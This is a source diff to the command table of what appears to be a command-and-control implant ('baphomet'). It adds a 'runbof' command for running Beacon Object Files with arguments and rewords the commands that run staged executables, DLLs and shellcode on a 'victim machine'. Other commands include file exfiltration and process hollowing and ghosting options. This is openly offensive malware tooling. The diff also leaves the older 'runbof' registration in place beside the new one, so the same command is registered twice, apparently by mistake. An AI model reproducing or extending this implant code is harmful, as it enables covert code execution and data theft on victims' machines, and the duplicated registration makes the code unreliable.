@@ -58,13 +58,17 @@ lurch::baphomet::init_commands() {
         commands.add_command("exfil", "exfiltrates a file")
             .arg<std::string>("--directory-entry", "-de", true);
 
-        commands.add_command("runexe", "runs an executable file on the victim machine")
+        commands.add_command("runexe", "runs a staged executable file on the victim machine")
             .arg<std::string>("--staged-file", "-sf", true)
             .arg<empty>("--hollow", "-h", false)
             .arg<empty>("--ghost", "-g", false);
 
-        commands.add_command("rundll", "runs a DLL on the victim machine")
+        commands.add_command("rundll", "runs a staged DLL on the victim machine")
             .arg<std::string>("--staged-file", "-sf", true);
+
+        commands.add_command("runbof", "runs a staged Beacon Object File on the victim machine")
+            .arg<std::string>("--staged-file", "-sf", true)
+            .arg<std::string>("--arguments", "-a", false);
 
         commands.add_command("runbof", "runs a Beacon Object File on the victim machine") // TODO: no bof arguments yet :(
             .arg<std::string>("--staged-file", "-sf", true);
@@ -95,7 +99,8 @@ lurch::baphomet::init_commands() {
             {"cp",          &baphomet::cp},
             {"ps",          &baphomet::ps},
             {"cmd",         &baphomet::cmd},
-            {"exfil",      &baphomet::exfil},
+            {"exfil",       &baphomet::exfil},
+            {"runbof",      &baphomet::runbof},
             {"runexe",      &baphomet::runexe},
             {"rundll",      &baphomet::rundll},
             {"runshellcode", &baphomet::runshellcode},
